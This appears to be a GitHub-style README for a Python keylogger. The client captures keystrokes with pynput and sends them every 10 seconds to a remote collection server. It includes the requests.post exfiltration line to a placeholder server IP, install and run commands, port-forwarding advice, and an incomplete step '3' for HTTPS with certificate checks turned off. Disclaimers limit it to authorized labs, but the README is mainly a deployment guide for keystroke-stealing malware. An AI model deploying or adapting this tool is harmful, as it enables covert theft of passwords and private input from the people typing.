
# 🕵️ Python Keylogger with Remote Logging Server

This project demonstrates a basic keylogger in Python (`keyloggerdk.py`) that captures keystrokes from a user machine and sends them over HTTP to a central logging server (`store_keystrokes_server.py`). The server stores the logs in a timestamped file (`keystrokes.log`).

⚠️ **For educational and authorized testing purposes only. Do NOT run this on any machine without explicit permission.**

---

## 📁 Project Structure

```
.
├── keyloggerdk.py             # Client-side keylogger
├── store_keystrokes_server.py # Server-side script to receive and store keystrokes
├── keystrokes.log             # Output file storing all received keystrokes
├── cert.pem                   # SSL certificate (for HTTPS, optional)
├── key.pem                    # SSL private key (for HTTPS, optional)
```

---

## 🔧 Requirements

- Python 3.x
- `pynput` and `requests` on the client
- No extra packages needed for the server (uses `http.server`)

### Install dependencies (on client):

```bash
pip install pynput requests
```

---

## ▶️ How It Works

### 🔹 Client — `keyloggerdk.py`

- Captures keystrokes using `pynput`.
- Stores them in a string (`text`).
- Every 10 seconds, sends them as JSON to the remote server using:
  ```python
  requests.post(f"http://<server_ip>:8080", data=json, headers={"Content-Type": "application/json"})
  ```

### 🔹 Server — `store_keystrokes_server.py`

- Listens on port `8080`.
- Accepts POST requests with JSON body.
- Extracts the `keyboardData` from the request and appends it to `keystrokes.log`.

---

## ✅ Running the Project

### 1. On the **Server** (receiver):

```bash
python store_keystrokes_server.py
```

Make sure port `8080` is open or forwarded (if behind NAT).

### 2. On the **Client** (sender):

Edit the IP in `keyloggerdk.py`:
```python
ip_address = "YOUR.SERVER.IP.ADDRESS"
```

Then run:
```bash
python keyloggerdk.py
```

Logs will appear in the server’s `keystrokes.log`.

---


### 3: Update `keyloggerdk.py`

Change:
```python
http → https
requests.post(..., verify=False)
```

---

## 🛡️ Security Note

This project is for **learning and demonstration only**. Real-world keyloggers are serious security threats and **illegal** without explicit permission. Use this responsibly in ethical hacking labs or CTFs.

---

## 📄 License

MIT License — Educational use only.
